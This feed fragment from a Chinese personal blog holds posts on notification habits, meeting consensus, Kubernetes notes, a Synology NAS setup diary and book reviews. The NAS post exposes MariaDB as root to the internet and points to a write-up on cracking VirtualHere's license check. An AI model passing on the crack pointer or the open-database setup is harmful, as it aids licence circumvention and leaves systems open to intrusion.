        <content type="html"><![CDATA[<p>把手机的消息功能全部禁用（除银行卡和短信）已经有三个多月了，说一下感受。</p><p>以前总是担心别人联系的时候，没有及时了解和回应，也殷切知道在社交平台上的互动情况，因此几乎所有的消息都是打开状态，最后的结果是，每天打开手机的频次将近一两百次，很容易被打断。</p><p>大概一年多以前卸载了微信之外的所有社交平台，刚开始不适应，每隔一会儿就想打开网页版看一下，半个月以后，才意识到这些平台不看也没啥事，到现在基本上可以做到一天只打开一两次，由于网页版体验太差，每次最多也只会看几分钟。</p><p>消息通道关闭以后，会定期查阅，查阅的效率非常高，不重要的信息一瞟而过，关键是可以集中处理所有的消息，不会高频次打断自己的工作上下文。在手机上的时间也从每天五六个小时骤降到一两个小时，有的时候甚至一天下来才用半个小时不到。</p><p>之前也因为被打扰的次数太多，屏蔽了很多群消息，手机消息通道被关闭之后，群消息也没有了屏蔽的必要，这倒多了个好处，如果多次看到某个群的消息都是不重要的或者跟自己不相关的，就可以选择退群了，而不是被 muted 放在一个角落，默默地接受一大堆消息。</p><p>有人会担心，别人找你不能及时收到回复，对方不着急么？在工作中，真正着急的事情，大家都会选择钉一下，或者直接电话打过来了。近几个月还没有遇到过特别紧急的事情却没有及时处理的情况，除了一类：系统报警群的消息阅读不够及时，这或许也是为啥我打开钉钉这么频繁的原因之一。这个问题暂还没有想到特别好的解法，好在报警群不是只有我一个人盯着。</p><p>当手机成为身体的一部分以后，手机里的内容就会变得越来越重要，可是它真的那么重要么？放下手机，多找人聊一聊，多陪陪身边的人，多看看书，多运动一下，或许，会更好。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共识</title>
      <link href="/blog/2021/09/15/regq3g/"/>
      <url>/blog/2021/09/15/regq3g/</url>
      
        <content type="html"><![CDATA[<p>共识，相信很多人对这个词都特别有感触，一回面红耳赤的争辩，一次会议室的久坐，一场热热闹闹的脑暴……为了减少分歧而达成最终统一的过程，就是一个共识产生的过程。</p><p>需要注意的是，这里的“最终统一”并不意味着得到了每个人的同意，共识是在特定情景下的群体最优解。</p><p>每个人都有自己独特的价值观和世界观，我们很难在一两次讨论中去改变他人的观念，也没必要去改变，但不能因为个体之间观念或想法的差异，让整个事情停滞不前，一直处于争辩和讨论阶段。</p><p>很多会议没办法得到结论，要么是因为缺少输出，无人提出观点，要么就是观点太多，没办法达成共识。对于前者，需要的是一个相互信任的环境，让大家愿意表达；对于后者，需要的是倾听、认同、整理和归一。</p><p>达成共识的一个前提应该是相互尊重。如果每个人心中都只装得下自己的想法，不允许任何人挑战分毫，那么讨论就会变成一场说服对方的口水战，甚至演变成吵架。需要给对方表达的空间，而不是我说完，听不听随你，你说的，我懒得听。</p><p>达成共识之前一定要有一个心理预期：我的观点有百分之三四十能成为共识的一部分，那便是胜利。一个共识全部都由一个人输出，那不叫共识，那是一言堂。</p><p>为了更高效地达成共识，要在你来我往的口水唾沫之中，抓住一到两点大家都基本认可的方向，顺着这个思路再融入自己的想法，结构化输出，这是第一个阶段；第二个阶段是让在场的大多数人没有分歧，首先，将刚才的想法作为一个临时结论，定调，一旦有人提出意见，则融合认可结论的部分，然后消除分歧部分，如此这般应对个两三轮，大家看着这个临时结论不断被丰满和确定，自然而然就会认可这个结论作为本次讨论的共识。这算是一个达成共识的小技巧。</p><p>在我们的日常讨论中，达成最多的共识恐怕还是“下一次会议时间”……</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>技术《Kubernetes 权威指南》</title>
      <link href="/blog/2021/07/07/kc4bfb/"/>
      <url>/blog/2021/07/07/kc4bfb/</url>
      
        <content type="html"><![CDATA[<p>最近花了不少时间把《Kubernetes 权威指南》这本厚达 800 页的书翻完了，这是一本工程实践 + API 说明书，代码和接口描述估计就占了 400+ 页，综合评分三颗星吧，唯一读起来有点意思的是第七章网络原理。<br><img src="/../blogimgs/2021/07/07/1625621739132-93b8fb54-9083-4298-9ce7-2d3b2cc153cb.png" alt="image"><br>这本书买了有段时间了，一直放在家里吃灰，在折腾 NAS 的时候为了方便管理 Docker，想部署一个 Kubernetes，再加上自己做的业务迁移在云上容器跑了半年多了，很多问题一直是一知半解的，本着吃透相关知识的精神翻开了这本厚厚的书。</p><h2 id="k8s-分布式架构"><a href="#k8s-分布式架构" class="headerlink" title="k8s 分布式架构"></a>k8s 分布式架构</h2><p>Kubernetes 具备完备的集群管理能力，包括多层级的安全防护和准入机制、多租户应用支撑能力、透明的服务注册和服务发现机制、内建的智能负载均衡器、强大的故障发现和自我修复能力、服务滚动升级和在线扩容能力、可拓展的资源自动调度机制，以及多粒度的资源配额管理能力。<br><img src="/../blogimgs/2021/07/07/1625642181681-52c57059-a05e-4eaf-92af-438c32610e19.jpeg" alt="image">局域网内四台物理机，一台作为 k8s 的 Master Node，另外三台作为 Worker Node，所在网段为 192.168.1.0&#x2F;24，每个 Node 中部署的 Pod 规划的网段是 10.1.0.0&#x2F;16。</p><p>Master Node 和 Worker Node 是怎么产生的呢？可以通过 <code>kubeadm</code> 这个工具安装：</p><h1 id="在一个节点上执行如下指令，让节点成为-Master"><a href="#在一个节点上执行如下指令，让节点成为-Master" class="headerlink" title="在一个节点上执行如下指令，让节点成为 Master"></a>在一个节点上执行如下指令，让节点成为 Master</h1><p>sudo kubeadm init –pod-network-cidr 10.1.0.0&#x2F;16</p><h1 id="此时会生成一个邀请指令，在其他节点上执行如下指令，会将自己视为-Worker-Node-加入到-k8s-集群"><a href="#此时会生成一个邀请指令，在其他节点上执行如下指令，会将自己视为-Worker-Node-加入到-k8s-集群" class="headerlink" title="此时会生成一个邀请指令，在其他节点上执行如下指令，会将自己视为 Worker Node 加入到 k8s 集群"></a>此时会生成一个邀请指令，在其他节点上执行如下指令，会将自己视为 Worker Node 加入到 k8s 集群</h1><p>kubeadm join 192.168.31.165:6443 –token t6tev0.nkzr4gy05kn4ht01无论是 Master Node 还是 Worker Node，上面都会运行着一个 kubelet 程序，它的作用是启动和停止容器的组件，我们称之为 Container Runtime，比较知名的就是 Docker 了。为了更具扩展性，Kubernetes v1.5 引入了 Container Runtime Interface（简称 CRI），这一规范化操作避免了各种 Runtime 的野蛮生长，让开发者可以专注于容器运行时本身。</p><p>当我们初始化一个 k8s 集群的时候，集群会运行几个控制平面组件，包括 kube-apiserver、kube-controller-manager、kube-scheduler、etcd 等，Kubernetes API Server 的核心功能是提供 Kubernetes 各类资源对象的 CURD，包括 Watch 和 HTTP Restful Interface，它是集群内各个功能模块之间数据交互和通信的中心枢纽，是整个系统的数据总线和数据中心；etcd 是个持久化储存的 KV Store，它提供的 Watch API 保障了整个集群各类事件的及时响应和快速处理。<br><img src="/../blogimgs/2021/07/07/1625638283889-d67b4f22-3412-4415-8a92-7f574a5af5e6.jpeg" alt="image">Kubernetes Controller Manager 是一个中控组件，能够在集群中感知异常或状态变化，并及时自动化修复和完善，比如 Node 意外宕机、某个服务设定的 3 个 Pod 副本变成了 2 个等等它都会主动处理；与之并重的另外一个组件是 Kubernetes Scheduler，它的作用是将待调度的 Pod 通过一些复杂的调度流程计算出最佳目标节点；而 Kubernetes Node 也即 kubelet，是一个执行器，它负责将上游传递过来的 CURD Pod 指令执行下去，同时会不断向 API Server 报告自己的情况，方便给 Controller Manager、Scheduler 以及集群内的其他组件做决策。</p><h2 id="服务创建和发布"><a href="#服务创建和发布" class="headerlink" title="服务创建和发布"></a>服务创建和发布</h2><p>在 Kubernetes 中，Service 是分布式集群架构的核心，它是对一组 Pod 的抽象，会根据负载均衡策略来访问这组 Pod，从功能上看，Service 就像是一个反向代理，只不过这个反向代理会被 Kubernetes 统一自动管理。Service 在 Node 中由 kube-proxy 进程来实现的，这个进程可以理解成 Service 的透明代理兼负载均衡器，其核心功能就是将某个 Service 的访问请求转发到后端的多个 Pod 实例上。<br><img src="/../blogimgs/2021/07/07/1625647284055-e5752830-656f-4032-8c00-119a71ed78a6.jpeg" alt="image">当集群中 Service 或者 Pod 发生变化的时候，所有的信息会被同步到 API Server 的 Endpoints Controller，然后将事件同步到各个节点的 kube-proxy 程序，程序会自动修改节点中对应 Service 的 iptables 信息。</p><p>服务的发布方式有<a href="https://kubernetes.io/zh/docs/concepts/services-networking/service/#proxy-mode-iptables">多种</a>，可以是 ClusterIP 仅集群内访问，也可以是 NodePort 允许外部访问，上图所示将服务通过 NodePort 暴露，所有的流量会经过 NodePort，然后走 iptables 策略选择最终的 Pod，进入 Node 后进行一次 DNAT 将流量发到目标 Pod。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>群晖 NAS 折腾小记</title>
      <link href="/blog/2021/06/22/rvls1e/"/>
      <url>/blog/2021/06/22/rvls1e/</url>
      
        <content type="html"><![CDATA[<p>200G 的 iCloud 的储存（21 元&#x2F;月）已经不够用了，只能升级到 2T（68 元&#x2F;月），5 年下来价格是 4080 元，也就是 2 块 2T SSD 的价格，想想还不如在家搭建一个 NAS，但是呢，便捷性又不够，还得自己各种折腾，考虑网络、稳定性和数据安全等各种问题。</p><p>这是一条来自 2020.09.26 的<a href="https://weibo.com/1812166904/JmsZ4kPAq">微博</a>，由于家里长期一台配置还比较高的闲置 Mac Pro 挂机，在要不要再搞一台 NAS 这件事情上犹豫了很久，最后决定还是趁着国庆假期折腾一番：</p><p>十一假期准备折腾下 NAS，看了一些文章，还是有几个问题想问问有经验的朋友，我的需求大概是这样的：</p><ol><li>需要跑 1～3 个虚拟机，Windows 系统和 Linux 系统，预计最低 16G 以上内存才能满足需求</li><li>所有的服务都会通过 Docker 镜像提供，CPU 要强一点，有计算类服务</li><li>硬盘要求大概是 6T，数据双备份，也就是 18T 要求</li><li>支持千兆网络，最好是多网卡</li></ol><p>估摸着需要一个可拓展内存位、CPU 较强、盘位多的 NAS，有推荐的选项么，能耗如何？耐久性如何？噪声如何？相比直接一台 MBP（家有闲置） 通过 USB 连大硬盘最大的差异是啥？</p><h2 id="选购产品"><a href="#选购产品" class="headerlink" title="选购产品"></a>选购产品</h2><p>NAS 的全称是 Network attached Storage，网络附属储存，它被创造出来就是为了解决数据储存问题的，围绕数据储存从速度、安全性、性能和能耗等各个方面优化产品，并且针对不同用户场景提供了超级丰富的个性化配置，所以你搜一个群晖，能看到一大堆的型号，玲琅满目。</p><p>几乎 90% 的人都建议我不要在 NAS 上跑虚拟机和 Docker，也有同学给出了数据，4c16g 最多也就跑一个虚拟机和十来个 Docker 服务，我找了下群晖的产品，配置达到 4 核 16g 内存的产品，加上几块磁盘，价格随随便便上万，若真的期望储存和 CPU 都满足我的需求，怎么也得 6c32g，光群晖裸机的价格就得一万二，如果再考虑安全性，搞一个 raid5，一万大几的预算就没了。作为玩具，似乎没啥必要，最后退而求其次买了个稍微便宜点的：<br><img src="/../blogimgs/2021/06/22/1624293103199-7eacb55c-3a73-41b5-b1f1-e4f190d7a54f.png" alt="image"></p><p>倒不是说不建议花一两万，而是有更好的配置方案，让计算跟储存分离，配置一台 2u 的服务器，控制在七千的预算便可以获得 64g 内存以及 i3 甚至更高配的 CPU，然后加一个 4～6 盘位的群晖，价格也能控制到一万以内，如果需求没那么刚，还可以降低配置，将成本控制到七八千。我为了省事儿，也懒得折腾服务器，就选购了8G 内存的 920+，配置了 3 个盘位，足够我用好几年了。</p><p>如果是计算和储存分离，我可能会更加倾向 QNAP 了，与群晖相同价格的机器，配置会好不少。从操作系统的体验上，群晖会更加亲民，不过像我这种每天跟命令行打交道的人，UI 就无所谓了。</p><p>当然，选择 920+ 和 3 块酷狼盘也是有其他理由的：</p><p>大学就吃过硬盘的亏，两个 500G 的硬盘全坏了，现在想想，真的可惜了那上百 G 的种子🦜</p><p>所以 NAS 方案，我是肯定不会选 raid 0 的，而 raid 1 最起码得 10T 以上的盘才够用，价格高不说，再多盘位也没用，raid 6 费两块盘，安全性是多了，但是性能也下去了，综合考虑还是选了 raid 5。</p><p>raid 5 方案至少需要 3 块盘才能配，群晖的 plus 系列 220+ 和 720+ 就排除了，默认都是两盘位，420+ 可以满足需求，但是考虑到未来磁盘可能不够用的情况，还是选了可拓展的 920+。</p><p>红盘的坏盘率有点高，口碑也不好，希捷两类硬盘，酷狼盘和企业盘，后者质保更长，但是噪声略大，最后还是选了 3块 8T 的酷狼，不够了再加。</p><h2 id="数据方案"><a href="#数据方案" class="headerlink" title="数据方案"></a>数据方案</h2><p>NAS 组 raid 5 有不少朋友反馈，风险也挺大的，一般我们的硬盘都是同时间购买，使用寿命也差不多，这就容易在几年后出现多块盘稳定性同时不够的情况，当一块盘坏掉，在利用其它几块盘恢复这块的时候，其它几块盘的负载也就上去了，这个时候很可能出现雪崩问题。</p><p>我想了一下，有几个方案可以适当缓解问题，一个是增加盘位，让更多的盘一起扛负载，另外一个就是让盘的大小稍微偏小一些，比如购买 6TB 甚至 4TB 的盘，恢复速度更快。硬盘的寿命一般在 3<del>5 年，真正能抗 10 年的怕是不多，未来硬盘的价格还会持续下降，每隔 2</del>3 换一两块磁盘的必要性还是比较大的。</p><p>为了兼顾数据的读取速度和稳定性，也考虑到后期增加盘位时硬盘大小不一致带来的浪费问题，给群晖 NAS 配置了 SHR 储存方案。SHR 是对 raid1 和 raid5 的组合实现，详细研究了下这两种储存技术的实现原理：</p><p>对于 raid5，了解它可以阅读<a href="https://post.smzdm.com/p/az5005qo/">这篇文章</a>，本质是利用异或运算做数据的奇偶校验，奇偶检验可以甄别 1 byte 数据的异常问题，它无法具体知道是哪 1 byte，但由于硬盘损坏具备位置确定性，利用这一点就可以很轻松地利用正常数据恢复异常盘位数据了。 raid5 损坏超过两块盘数据就不可恢复来，因此盘位越多，同时损坏多块盘的概率也就越大，可以说 3 块盘的 raid5 安全性从概率上来讲应该是最高的了。</p><p>raid1 是数据的 1:1 备份，SHR 是以最小盘容量为基准在做完 raid5 以后，剩下的两块储存会做 raid1，最后一块盘上多出来的空间会废弃。关于 raid1，<a href="https://www.cnblogs.com/ivictor/p/6099807.html">这篇文章</a>解释的还比较详细，raid1 的特点就是数据写入较慢，比 raid5 要慢很多，但是 raid1 的储存空间在硬盘储存前期是不会被用到的，因为需要先将 raid5 的空间存满。</p><p>SHR 虽然可以提升硬盘的空间利用率，但是一旦出故障，恢复起来的难度也会稍微高一些，首先需要找到所有盘上 raid5 和 raid1 的扇区分区位置，然后需要对应地通过不同的算法来恢复数据，当然，成本也不算特别高，至少出现问题，拿着专业的数据恢复工具，我还是有信心可以恢复原始数据的。</p><p>我一直担心断电对磁盘和数据一致性的影响，恰巧在购买群晖的第二周，小区断电一次，当时心里慌慌的，感觉弄好的配置啥的会因为断电，导致数据丢失，配置异常，甚至开不了机，大约半小时电力恢复以后，长按开机键，等待绿灯闪烁，打开群晖的 Web 界面，果然……还是自己想多了，一点事儿没有-_-||</p><h2 id="群晖系统和软件"><a href="#群晖系统和软件" class="headerlink" title="群晖系统和软件"></a>群晖系统和软件</h2><p>之前在团队周会分享的时候有详细介绍过对 NAS 的选购、数据方案和软件介绍，但那个时候我对群晖只能说知道个皮毛，也就是把 Virtual Machine 跑了起来，把它当做了一个云盘工具，买回来折腾了三五天以后，就挂机闲置了半年，直到近期在重新整理个人数据的时候，又重新把这个大玩具捡了起来。</p><p>群晖的套件中心提供了非常多的应用，基本可以满足日常的数据管理需求：<br><img src="/../blogimgs/2021/06/22/1624294223228-cacbcfa0-592a-4e84-a52b-fa6d9dfbee58.png" alt="image"></p><p>将内网的服务暴露到公网的方案非常多，路由层可以做，NAS 层也可以做，我使用的是 Dnspod 提供的 DNS 解析服务，以及腾讯云提供的免费 SSL 证书，在云上申请好证书，然后下载下来，在 <code>控制面板 &gt; 安全性 &gt; 证书</code> 初可以完成证书的上传和配置。</p><h3 id="MariaDB"><a href="#MariaDB" class="headerlink" title="MariaDB"></a>MariaDB</h3><p>在群晖上折腾最多的，还是 SSH 上去后，通过命令行安装软件，如何将服务暴露到外网，就拿 MariaDB 来说，首先需要去 <code>/var/packages/MariaDB10/etc</code> 增加 <code>my.cnf</code> 文件，并修改配置，</p><h1 id="默认是-127-0-0-1，也就是只能通过本地环回网络打开"><a href="#默认是-127-0-0-1，也就是只能通过本地环回网络打开" class="headerlink" title="默认是 127.0.0.1，也就是只能通过本地环回网络打开"></a>默认是 127.0.0.1，也就是只能通过本地环回网络打开</h1><p>bind-address &#x3D; 0.0.0.0然后重启应用，<br>sudo &#x2F;usr&#x2F;syno&#x2F;bin&#x2F;synopkg restart MariaDB10这个时候就可以在外网直接访问 DB 访问了：<br>mysql -u root -h nas_domain.com -P 3307在陌生的系统中寻找各种配置真的是一件十分费劲的事情，网上找半天才能找到相关的问题，这里还是比较推荐去 Synology 的官网找资料，十分全面且基本准确。</p><h3 id="VirtualHere"><a href="#VirtualHere" class="headerlink" title="VirtualHere"></a>VirtualHere</h3><p>研究 NAS 的时候发现了一个有意思的软件，VirtualHere，通过它可以远程访问安装了 VirtualHere Server 的终端上的所有外接 USB 设备，而本地只需要安装一个 VirtualHere Client 就行了，使用起来十分便捷。其使用效果如同 USB 设备直接插在了本地终端的 USB 接口上，几乎没有区别，IO 速度会受网速影响，但如果是在同一个局域网，影响也是可以忽略的。</p><p>其原理是通过串口编程，在 Client 和 Server 之间实现了全部串口通讯协议，通过 Client 将指令传达到 Server 然后转发到 USB 串口。不过这个软件略贵，需要 50 美刀，家里的打印机、扫描仪等任何可以通过 USB 接入的设备都可以直接通过 VirtualHere 接入到网络，然后无缝对接到任何终端（Mac&#x2F;Linux&#x2F;Windows）上，就好像这些设备在你身边一样。</p><p>对比了下几款同类软件，USB Network Gate 是功能最全面的，但是价格也更高，需要 150 美刀，如果有相似需求，可以尝试下 VirtualHere，在受限情况下（一次只能共享一个 USB）可免费试用 10 天。</p><p>稍微研究了下它的签名策略，拿到 VirtualHere Server 所在终端的串口+硬件信息，然后将这些信息提交到它的官网，付完钱会把密钥发到你的邮箱，之后的 Client 和 Server 交互就跟它的官网没啥关系了。也就是说 Server 自己实现了整个解码逻辑。网上搜了下，果然有人把 VirtualHere 的汇编代码搬了出来，注释掉解码的逻辑就可以长期使用了。非完全破解，<a href="http://weibo.cn/sinaurl?toasturl=https://grimore.org/cracks/virtualhere_usb/3.5.4">仅破解思路文章</a> ，请购买正版。</p><h3 id="Virtual-Machine"><a href="#Virtual-Machine" class="headerlink" title="Virtual Machine"></a>Virtual Machine</h3><p>如果家里设备比较多，路由器配置又比较一般，在网络流量比较大的时候，很可能会导致整个局域网通讯都处在半瘫痪状态，你可以跑过去重启下路由器，当然也可以考虑换一个一两千的高配路由，我最近还学了个其它的方法，安装软路由来解决问题，大致步骤是：</p><ol><li>先电话联系运营商停止光猫的自动拨号，也可以登录到设备自己设置，改成桥接到 ISP 的模式</li><li>关闭路由器的自动拨号，相当于让路由变成一个带无线接入能力的交换机，通过 LAN 口接入光猫</li><li>在内网一台设备上安装软路由，开启自动拨号和 DHCP，连接到交换机的另一个 LAN 口，此时内网的所有 IP 分配将由软路由接管</li></ol><p>可以买一台便宜的工控机专门运行软路由，如果家里有 NAS 的话，也可以将软路由跑在 NAS 上的虚拟机上。</p><p>只不过这里有个问题，假设软路由所在机器的网口和交换机（路由器）网口都是千兆，并且你的设备都是通过交换机上网，一旦有终端跑满从交换机到软路由的千兆带宽（高速 BT 或者大文件拷贝），那么其他终端接入网络就会出现塞车问题，怎么解呢？一般工控机和 NAS 都有双网卡，可以考虑再拉一根网线从软路由到交换机，这样软路由就可以输出两千兆的带宽到交换机了。<br><img src="/../blogimgs/2021/06/22/1624295423946-dcfc500e-9c7f-4fcc-92b6-3c1cad40b4d6.png" alt="image"></p><p>我在虚拟机上安装了两个系统，一个是 LEDE，另外一个是 Window7。上面说的软路由就是图中安装 LEDE。之所以会安装一个 Win7 系统，是偶尔需要用到招行香港银行的专业版交易工具，它只支持 Windows 系统。Virtual Machine 有一个好处，当你启动好系统以后，可以通过 Web 浏览器远程打开，这对我来说真是太方便了，利用 VirtualHere 还可以将 USB Key 随时分享给远程的 Windows 系统，十分便捷。</p><p>唯一的缺点就是 Windows 对内存和 CPU 的消耗太大了，每次为了打开这个远程系统，我都需要先去 NAS 上关闭几个略占内存的应用，比如 Plex、Docker-gitlab 等等。</p><h3 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h3><p>之所以近期去折腾 NAS，也是想起来之前给孩子记录生活的博客系统，由于之前在阿里云购买的机器到期未续费，博客停更了两年，看到群晖上可以部署 Nginx 和 Apache，认认真真的折腾了好几个晚上，把几乎所有你想得到的和想不到的坑都踩完了，然后把之前的那份 <code>wordpress.tar.gz</code> 重新部署到了私有数据中心：<br><img src="/../blogimgs/2021/06/22/1624296072815-19bd9b75-a5e5-457c-84a8-e6355f7ab516.png" alt="image"></p><p>目前运行起来还是非常稳定的，修复了几个 WordPress 发布慢的 bug。</p><h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>关于系统和软件部分，省略了几万字，折腾的过程中遇到的问题非常多，但大多数都是命令行操作时遇到的，为了让所有对外的服务都是 HTTPS 的，并且增加几道安全防火墙，不得不把系统研究得透透的。</p><p>总的来说，目前的 NAS 已经可以满足我的基本需要和进阶需要了，而且在折腾和学习的过程中，还养成了把自己做的各种程序封装成 Docker 应用的习惯，也摸索了一些比较有意思的实践，后续有空可以聊聊，今天先到这里。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>趣味《人类简史》</title>
      <link href="/blog/2021/06/22/gqg6fm/"/>
      <url>/blog/2021/06/22/gqg6fm/</url>
      
        <content type="html"><![CDATA[<p>作者：[以色列] 尤瓦尔·赫拉利<br><img src="/../blogimgs/2021/06/22/1624377279837-7e5466f3-0ce6-4084-ba43-8706d2dabd64.png" alt="image"></p><p>译者叫林俊宏，翻译水平非常不错，语言功底很强。</p><p>看《人类简史》，让我想起了《罗辑思维》的罗胖，书中的叙述方式，非常有跳跃性，使用逻辑和科学对人类进化史进行了一场生动有趣的推导和讲说。前两章讲认知革命，聊到了语言，很有意思。</p><p>语言不仅仅是交流的工具，人类之所以能够站在食物链的顶端，从史前生物进化成智人，正是因为语言带来了一场认知革命，大猩猩能够跟同伴们表达“对面来了一头狮子”，但是无法表达“一头健壮的雄狮正迈着有力的步伐朝着羊群奔跑过去，后面还跟着两头小狮子”。</p><p>有了语言之后，智人们在一起就会开始八卦，聊天的内容就会从真实延伸到虚构，让人浮想联翩，正因如此，宗教、图腾、人文等也能够发展起来，语言让人跟人之间的关系变得更加亲密，让协作变得更加简单，即便是在陌生人之间。</p><p>在一万年前人类开始种植小麦，有了固定的热量来源，作者却说，我们被小麦给绑架了，农业革命就是一个大大的陷阱。</p><p>小麦让人类开始了定居的农耕生活，也因此让女人有了更安定的居住环境和生活保障，于是女人不断地生小孩，新出生的人口增加了对小麦的需求，于是人类不断扩大农耕面积，从而营造出更好地环境，以此循环。到最后，人类再也离不开小麦，而且迫不得已需要产出更多的小麦。</p><p>原来，在一万年前，“卷”就刻到了人类的基因里😅😅😅</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 · 读书的方法和趣味</title>
      <link href="/blog/2021/06/17/lbcncv/"/>
      <url>/blog/2021/06/17/lbcncv/</url>
      
        <content type="html"><![CDATA[<p>读书看报的年代似乎已经过去了，这是一个信息泛滥的时代，拿起手机，我们便可以从大量渠道获取无数讯息，但让人无奈的是，我们却没有足够好的手段来过滤无效的杂音和噪音，也难以在各种软件的频繁推送中安静地阅读。我们总是有很多的事情需要处理，我们很忙。</p><p>慢慢地，阅读也变成了一件奢侈的事情。</p><p>曾经买过两个 Kindle，也买了 Kindle Unlimited 服务，下载了几百本书，而真正阅读的却没有几本。如今打开 Kindle 做的最多的一件事情便是给它充电，因为每次打开都因为搁置太久没电了……</p><p>索性，还是选择纸质书吧，虽然买了不一定看，但购买了大几十本书，垒成几座小山以后，内心还是蛮有压力的。有同事说，他会把书垒到床头，晚上经常因为害怕书太高砸到自己，因此不得不翻看几本，慢慢地，一年下来，阅读量也就上去了。不得不说，这是个好主意。</p><p>今年我也买了五六十本书，内容上主要覆盖下面五个主题：</p><ul><li>孩子的成长</li><li>心理认知</li><li>时间和精力管理</li><li>投资理财</li><li>专业技术类</li></ul><p>不想买太多相关性不强的书，从近几年的阅读中得到一个经验，一定要读与当前遇到的问题、当前手头正在做的事情相关的书，阅读伴随着实践，总是可以带来更多的收益。</p><p>每每看到好书也都会在购物车里加购一下，等到购物车书籍达到三五十本的时候，会把不舍得删除的书下单买回来，现在家里的书房已经屯了不少书籍了。</p><p>大多数时间依然是不想看书的，但是偶尔瞟到一两本吸引人的书名，就忍不住拆开封面，翻上一两个小时，比如今天晚上打开的是《人类简史》，想看看人类到底经历了什么，这本书会从什么角度描述人类的历史，想知道看完这本书以后，我的认知会不会发生一些变化，能否从人类简史去推演未来的历史。事实上我购买这本书的时候，把这个系列的《今日简史》和《未来简史》也买了回来，隐隐地感觉后面两本书是作者挤牙膏写出来的，但依然想放在一起做一次主题阅读，看看作者到底会如何去写，如何去思考。</p><p>这或许就是我阅读的乐趣和动力。</p><p>以上，就把这段话作为知识库的「关于」部分吧。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习《正面管教》</title>
      <link href="/blog/2021/06/17/xhym7x/"/>
      <url>/blog/2021/06/17/xhym7x/</url>
      
        <content type="html"><![CDATA[<p>作者：Jane Nelsen<br><img src="/../blogimgs/2021/06/17/1623860612970-3e1a812b-cc86-4977-8390-17e3100fbcdd.png" alt="image"></p><p>陆陆续续，花了差不多三个多月才读完，非常值得再读第二遍的书。</p><p>一个缺乏正确教育的孩子，在个人自省能力被彻底释放之前，其行为、性格和态度等方面或多或少存在不足，甚至有着明显的叛逆和难以管教的问题。在阅读本书的过程中，我不断回忆自己成长的各个画面，仿佛一眼洞穿了当年那个缺乏管教的自己是如何在今天某些方面表现差劲的。</p><p>其实，再看看身边的人，那些 90 后 95 后所谓难以管理的年轻人，如果你把他们都当做孩子看待的话，身上似乎都透露着书中提到的各种问题。</p><p>这本书的作者提到，不要将本书作为一本技巧书，本书的目的并不是告诉读者如何应对孩子的各种无理取闹，而是通过详细的示范和教学，告诉读者需要正视问题，和善并坚定地，跟孩子一起解决问题。</p><p>我家孩子三岁了，每次孩子表现出让人难以理解，而我又制服不了的时候，我就会思考，是不是我对她的了解还不够，我需要通过什么方式去了解更多，最直接的方式莫过于读书，三个月里几乎每次端起这本书都能给我带来新的感悟，有的时候会反思自己对待孩子错误的态度，有的时候在想如何高质量地陪伴孩子，有的时候会照着书上的方法运用在孩子身上。但更多的，还在在阅读和实践的过程中，慢慢体会如何做好一个父亲，学会跟孩子相处，跟她一起成长。</p><p>这本书，我还会再仔细阅读第二遍，到时候再来补充更多的感悟。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速读《气候经济与人类未来》</title>
      <link href="/blog/2021/06/08/wo5fmu/"/>
      <url>/blog/2021/06/08/wo5fmu/</url>
      
        <content type="html"><![CDATA[<p>作者：比尔盖茨<br><img src="/../blogimgs/2021/06/08/1623861535686-19cfb391-1cd7-4446-b25e-214371ff798b.png" alt="image"></p><p>无论是新冠还是非典，无疑都是人类的灾难，发生在眼前的新冠便已造成了数百万人死亡、数千万人失去工作，可这相比持续对人类造成威胁的全球气候变化，其伤害值仍是小巫见大巫。</p><p>《气候经济与人类未来》这本书中的数字非常多，盖茨团队花了大量功夫研究和探索如何在未来几十年实现从 510 亿吨碳排放实现近零排放，他将碳排放的来源归为了五类：电力生产和储存、生产和制造、种植和养殖、交通运输、制冷和取暖，其占比分别是 27:31:19:16:7，本书从这五个角度依次给出了前沿的思考和创新提议，人类若按照这些提议在未来几十年持续投入技术革新和升级，近零排放这个计划是有可能达成的。不管是政策决策者、企业家还是忙于生计的普通民众，都将收益于这项行动计划。 #再读盖茨夫妇</p><p>实现零排放的目标需要创新驱动，需要多个行业在未来几年甚至几十年里，不断投入人才和财力，多管齐下，这也就意味着，未来将会在气候威胁大背景下涌现出非常多值得投资的项目。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读进行中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学会放手</title>
      <link href="/blog/2021/04/18/duqgqa/"/>
      <url>/blog/2021/04/18/duqgqa/</url>
      
